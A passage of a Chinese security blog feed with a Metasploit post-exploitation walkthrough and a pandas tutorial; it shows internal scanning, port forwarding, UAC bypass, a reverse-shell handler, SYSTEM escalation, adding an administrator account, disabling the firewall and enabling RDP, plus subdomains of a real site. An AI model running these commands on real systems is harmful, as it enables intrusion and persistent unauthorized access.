title="内网主机发现"></a>内网主机发现</h4><p>进去内网之后，我们使用相关模块进行主机发现。</p><h5 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; show options</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set threads 10</span><br><span class="line">threads &#x3D;&gt; 10</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set RHOSTS 172.18.0.2-100</span><br><span class="line">RHOSTS &#x3D;&gt; 172.18.0.2-100</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set PORTS 3306,8022</span><br><span class="line">PORTS &#x3D;&gt; 3306,8022</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] 172.18.0.3:           - 172.18.0.3:3306 - TCP OPEN</span><br><span class="line">[+] 172.18.0.2:           - 172.18.0.2:8022 - TCP OPEN</span><br><span class="line">[*] 172.18.0.2-100:       - Scanned 10 of 99 hosts (10% complete)</span><br></pre></td></tr></table></figure><h5 id="ARP扫描"><a href="#ARP扫描" class="headerlink" title="ARP扫描"></a>ARP扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;arp_scanner</span><br></pre></td></tr></table></figure><h4 id="Metasploit-Portfwd（端口转发-重定向）"><a href="#Metasploit-Portfwd（端口转发-重定向）" class="headerlink" title="Metasploit Portfwd（端口转发/重定向）"></a>Metasploit Portfwd（端口转发/重定向）</h4><p>在活动的Meterpreter会话中，键入<strong>portfwd -h</strong>将显示命令的各种选项和参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line">OPTIONS:</span><br><span class="line">     -L &gt;opt&gt;  要监听的本地主机（可选）。</span><br><span class="line">     -h        帮助横幅。</span><br><span class="line">     -l &gt;opt&gt;  要监听的本地端口。</span><br><span class="line">     -p &gt;opt&gt;  要连接的远程端口</span><br><span class="line">     -r &gt;opt&gt;  要连接的远程主机</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>Options：选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。</span><br><span class="line"></span><br><span class="line">-h：显示以上信息。</span><br><span class="line"></span><br><span class="line">-l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。</span><br><span class="line"></span><br><span class="line">-p：TCP连接将转发到的端口。</span><br><span class="line"></span><br><span class="line">-r：连接被中继到的IP地址（目标）。</span><br></pre></td></tr></table></figure><p> Arguments：参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Add：该参数用于创建转发。</span><br><span class="line"></span><br><span class="line">Delete：这将从我们的转发端口列表中删除先前的条目。</span><br><span class="line"></span><br><span class="line">List：这将列出当前转发的所有端口。</span><br><span class="line"></span><br><span class="line">Flush：这将删除我们的转发列表中的所有端口。</span><br></pre></td></tr></table></figure><p>例子：</p><p>Add参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add –l 3389 –p 3389 –r  [target host]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add会将端口转发添加到列表中，并将为我们创建一个隧道。请注意，此通道也将存在于Metasploit控制台之外，使其可用于任何终端会话。</span><br><span class="line">-l 3389是本地端口，将被监听并转发到我们的目标。这可以是您的机器上的任何端口，只要它尚未被使用。</span><br><span class="line">-p 3389是我们的定向主机上的目标端口。</span><br><span class="line">-r [target host]是我们的目标系统的IP或主机名。</span><br></pre></td></tr></table></figure><p>List参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd list</span><br><span class="line">0: 0.0.0.0:3389 -&gt; 172.16.194.191:3389</span><br><span class="line">1: 0.0.0.0:1337 -&gt; 172.16.194.191:1337</span><br><span class="line">2: 0.0.0.0:2222 -&gt; 172.16.194.191:2222</span><br><span class="line">3 total local port forwards.</span><br></pre></td></tr></table></figure><h4 id="Windows权限提升"><a href="#Windows权限提升" class="headerlink" title="Windows权限提升"></a>Windows权限提升</h4><ul><li><p>绕过UAC</p><p>bypassuac</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">或者</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;set target 1</span><br><span class="line">set target  1         #设置目标系统类型，1是64位，0是32位</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac  #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection  #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。</span><br></pre></td></tr></table></figure><p>RunAs绕过</p><p>创建一个可执行文件，目标机会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择“是”，就会触发返回一个高权限的meterpreter shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;ask):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   FILENAME                    no        File name on disk</span><br><span class="line">   PATH                        no        Location on disk, %TEMP% used if not set</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="Windows渗透"><a href="#Windows渗透" class="headerlink" title="Windows渗透"></a>Windows渗透</h4><h5 id="cmd与3389"><a href="#cmd与3389" class="headerlink" title="cmd与3389"></a>cmd与3389</h5><ul><li>监听木马</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; chcp 65001</span><br><span class="line">[-] Unknown command: chcp.</span><br><span class="line">msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 172.20.10.3</span><br><span class="line">LHOST &#x3D;&gt; 172.20.10.3</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 1234</span><br><span class="line">LPORT &#x3D;&gt; 1234</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.20.10.3:1234</span><br><span class="line">[*] Sending stage (176195 bytes) to 172.20.10.6</span><br><span class="line">[*] Meterpreter session 1 opened (172.20.10.3:1234 -&gt; 172.20.10.6:6198) at 2020-09-05 12:31:20 +0800</span><br></pre></td></tr></table></figure><ul><li>获取当前权限以及提权</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: GOD\Administrator</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory&#x2F;Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>切换cmdshell，注意切换之后cmdshell与msf的会话具有相同的权限</p><ul><li>添加用户并加入管理员组</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net user steady111 125219gxaGXA &#x2F;add</span><br><span class="line">net user steady111 125219gxaGXA &#x2F;add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net localgroup administrators steady111 &#x2F;add</span><br><span class="line">net localgroup administrators steady111 &#x2F;add</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><ul><li><p>开启关闭防火墙</p><p>windows2003之前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启防火墙：</span><br><span class="line">netsh firewall set opmode mode&#x3D;enable</span><br><span class="line">关闭防火墙：</span><br><span class="line">netsh firewall set opmode mode&#x3D;disable</span><br></pre></td></tr></table></figure><p>windows2003之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure></li></ul><ul><li>开启3389</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"> </span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br><span class="line">&quot; 2&gt;&amp;1</span><br></pre></td></tr></table></figure><ul><li>检查3389是否开放</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server</span><br><span class="line"></span><br><span class="line">1表示关闭0表示开放</span><br><span class="line"></span><br><span class="line">fDenyTSConnections    REG_DWORD    0x1</span><br></pre></td></tr></table></figure><ul><li>查看远程桌面服务所在的端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</span><br></pre></td></tr></table></figure><h5 id="MSF与3389"><a href="#MSF与3389" class="headerlink" title="MSF与3389"></a>MSF与3389</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp  #开启远程桌面</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;www2 PASSWORD&#x3D;123456 #添加用户</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662  #将3389端口转发到6662</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</span><br><span class="line">run getgui -f 6661 –e</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Metasploit–Meterpreter使用&quot;&gt;&lt;a href=&quot;#Metasploit–Meterpreter使用&quot; class=&quot;headerlink&quot; title=&quot;Metasploit–Meterpreter使用&quot;&gt;&lt;/a&gt;Metasploit–Met</summary>
      
    
    
    
    <category term="内网安全" scheme="http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网" scheme="http://s1eady.top/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Python学习--渗透测试小脚本</title>
    <link href="http://s1eady.top/2020/11/11/Python%E5%AD%A6%E4%B9%A0--%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    <id>http://s1eady.top/2020/11/11/Python%E5%AD%A6%E4%B9%A0--%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%84%9A%E6%9C%AC/</id>
    <published>2020-11-11T12:10:12.000Z</published>
    <updated>2020-11-10T02:34:24.714Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Python处理excel文档"><a href="#Python处理excel文档" class="headerlink" title="Python处理excel文档"></a>Python处理excel文档</h4><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200706131219279.png" alt="image-20200706131219279"></p><h5 id="pd-read-excel"><a href="#pd-read-excel" class="headerlink" title="pd.read_excel"></a>pd.read_excel</h5><h6 id="读取文件内容"><a href="#读取文件内容" class="headerlink" title="读取文件内容"></a>读取文件内容</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">content_list &#x3D; pd.read_excel(&quot;.&#x2F;52mf.com.xlsx&quot;)</span><br><span class="line">print(content_list)</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3.7 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;code&#x2F;python&#x2F;数据处理&#x2F;获取子域名的url</span><br><span class="line">     id                                url  ... elapsed  count</span><br><span class="line">0     9                 http:&#x2F;&#x2F;52mf.com:80  ...     0.2      1</span><br><span class="line">1    43            http:&#x2F;&#x2F;mail.52mf.com:80  ...     2.5      2</span><br><span class="line">2    51          https:&#x2F;&#x2F;mail.52mf.com:443  ...     2.5      2</span><br><span class="line">3    60      http:&#x2F;&#x2F;renter-api.52mf.com:80  ...     2.6      3</span><br><span class="line">4    68    https:&#x2F;&#x2F;renter-api.52mf.com:443  ...     2.6      3</span><br><span class="line">5    77             http:&#x2F;&#x2F;www.52mf.com:80  ...     2.6      3</span><br><span class="line">6    85           https:&#x2F;&#x2F;www.52mf.com:443  ...     2.6      3</span><br><span class="line">7    94               http:&#x2F;&#x2F;m.52mf.com:80  ...     9.4      4</span><br><span class="line">8   102             https:&#x2F;&#x2F;m.52mf.com:443  ...     9.4      4</span><br><span class="line">9   111              http:&#x2F;&#x2F;oa.52mf.com:80  ...     9.4      4</span><br><span class="line">10  145             http:&#x2F;&#x2F;vpn.52mf.com:80  ...    None      1</span><br><span class="line">11  153           https:&#x2F;&#x2F;vpn.52mf.com:443  ...    None      1</span><br><span class="line">12  162            http:&#x2F;&#x2F;smtp.52mf.com:80  ...    None      2</span><br><span class="line">13  170          https:&#x2F;&#x2F;smtp.52mf.com:443  ...    None      2</span><br><span class="line">14  179        http:&#x2F;&#x2F;provider.52mf.com:80  ...    None      4</span><br><span class="line">15  196             http:&#x2F;&#x2F;pop.52mf.com:80  ...    None      5</span><br><span class="line">16  204           https:&#x2F;&#x2F;pop.52mf.com:443  ...    None      5</span><br><span class="line">17  230            http:&#x2F;&#x2F;imap.52mf.com:80  ...    None      7</span><br><span class="line">18  238          https:&#x2F;&#x2F;imap.52mf.com:443  ...    None      7</span><br><span class="line">19  281               http:&#x2F;&#x2F;s.52mf.com:80  ...    None     13</span><br><span class="line">20  289             https:&#x2F;&#x2F;s.52mf.com:443  ...    None     13</span><br><span class="line">21  315    http:&#x2F;&#x2F;autodiscover.52mf.com:80  ...    None     16</span><br><span class="line">22  323  https:&#x2F;&#x2F;autodiscover.52mf.com:443  ...    None     16</span><br></pre></td></tr></table></figure><h6 id="name-指定列名"><a href="#name-指定列名" class="headerlink" title="name:指定列名"></a>name:指定列名</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">值为list或者str，默认None，一般使用list传参&lt;br&gt;</span><br><span class="line">指定表头的名称，list内的值跟表的列数要一一对应，即不能多也不能少，多或者少都会抛出ValueError错误: Number of passed names did not match number of header fields in the file</span><br><span class="line">使用str类型传参时会循环出每一个字符在赋值给每一个表头，即不能多也不能少，多或者少都会抛出ValueError错误。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">content_list &#x3D; pd.read_excel(&quot;.&#x2F;52mf.com.xlsx&quot;,names&#x3D;&quot;abcdefghijklmn&quot;)</span><br><span class="line">print(content_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3.7 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;code&#x2F;python&#x2F;数据处理&#x2F;获取子域名的url</span><br><span class="line">      a                                  b  ...     m   n</span><br><span class="line">0     9                 http:&#x2F;&#x2F;52mf.com:80  ...   0.2   1</span><br><span class="line">1    43            http:&#x2F;&#x2F;mail.52mf.com:80  ...   2.5   2</span><br><span class="line">2    51          https:&#x2F;&#x2F;mail.52mf.com:443  ...   2.5   2</span><br><span class="line">3    60      http:&#x2F;&#x2F;renter-api.52mf.com:80  ...   2.6   3</span><br><span class="line">4    68    https:&#x2F;&#x2F;renter-api.52mf.com:443  ...   2.6   3</span><br><span class="line">5    77             http:&#x2F;&#x2F;www.52mf.com:80  ...   2.6   3</span><br><span class="line">6    85           https:&#x2F;&#x2F;www.52mf.com:443  ...   2.6   3</span><br><span class="line">7    94               http:&#x2F;&#x2F;m.52mf.com:80  ...   9.4   4</span><br><span class="line">8   102             https:&#x2F;&#x2F;m.52mf.com:443  ...   9.4   4</span><br><span class="line">9   111              http:&#x2F;&#x2F;oa.52mf.com:80  ...   9.4   4</span><br><span class="line">10  145             http:&#x2F;&#x2F;vpn.52mf.com:80  ...  None   1</span><br><span class="line">11  153           https:&#x2F;&#x2F;vpn.52mf.com:443  ...  None   1</span><br><span class="line">12  162            http:&#x2F;&#x2F;smtp.52mf.com:80  ...  None   2</span><br><span class="line">13  170          https:&#x2F;&#x2F;smtp.52mf.com:443  ...  None   2</span><br><span class="line">14  179        http:&#x2F;&#x2F;provider.52mf.com:80  ...  None   4</span><br><span class="line">15  196             http:&#x2F;&#x2F;pop.52mf.com:80  ...  None   5</span><br><span class="line">16  204           https:&#x2F;&#x2F;pop.52mf.com:443  ...  None   5</span><br><span class="line">17  230            http:&#x2F;&#x2F;imap.52mf.com:80  ...  None   7</span><br><span class="line">18  238          https:&#x2F;&#x2F;imap.52mf.com:443  ...  None   7</span><br><span class="line">19  281               http:&#x2F;&#x2F;s.52mf.com:80  ...  None  13</span><br><span class="line">20  289             https:&#x2F;&#x2F;s.52mf.com:443  ...  None  13</span><br><span class="line">21  315    http:&#x2F;&#x2F;autodiscover.52mf.com:80  ...  None  16</span><br><span class="line">22  323  https:&#x2F;&#x2F;autodiscover.52mf.com:443  ...  None  16</span><br></pre></td></tr></table></figure><h6 id="usecols"><a href="#usecols" class="headerlink" title="usecols"></a>usecols</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">值为None、int、str、list类型，指定读取表格的指定列</span><br><span class="line"> </span><br><span class="line">None时，读取整个excel列</span><br><span class="line">int时，读取从第一列开始到该数值（包含）结束的中间所有列</span><br><span class="line">str时，只能按照excel的格式指定列，如&quot;A: G&quot;，读取A列到G列的所有列</span><br><span class="line">list时，list的元素只能是int型，如：[1, 4],表示读取list内指定的第一和第四列</span><br></pre></td></tr></table></figure><h5 id="案例–渗透中扫描到子域名存入xlsx文件并提取子域名"><a href="#案例–渗透中扫描到子域名存入xlsx文件并提取子域名" class="headerlink" title="案例–渗透中扫描到子域名存入xlsx文件并提取子域名"></a>案例–渗透中扫描到子域名存入xlsx文件并提取子域名</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">content_list = pd.read_excel(<span class="string">&quot;./52mf.com.xlsx&quot;</span>,usecols=[<span class="number">2</span>,<span class="number">5</span>],names=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">contents_list = content_list.values.tolist()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;./mofang_url.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> list <span class="keyword">in</span> contents_list:</span><br><span class="line">        print(list[<span class="number">0</span>])</span><br><span class="line">        fp.write(list[<span class="number">0</span>]+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Python处理cvs文档"><a href="#Python处理cvs文档" class="headerlink" title="Python处理cvs文档"></a>Python处理cvs文档</h4><h5 id="CSV文件的写入"><a href="#CSV文件的写入" class="headerlink" title="CSV文件的写入"></a>CSV文件的写入</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以写入方式打开一个csv文件</span></span><br><span class="line">file = open(<span class="string">&#x27;steady.csv&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用writer方法，传入csv文件对象，得到的结果是一个CSVWriter对象</span></span><br><span class="line">writer = csv.writer(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用CSVWriter对象的writerow方法，一行行的写入数据</span></span><br><span class="line">writer.writerow([<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;score&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还可以调用writerows方法，一次性写入多行数据</span></span><br><span class="line">writer.writerows([[<span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;18&#x27;</span>, <span class="string">&#x27;98&#x27;</span>],[<span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;99&#x27;</span>], [<span class="string">&#x27;wangwu&#x27;</span>, <span 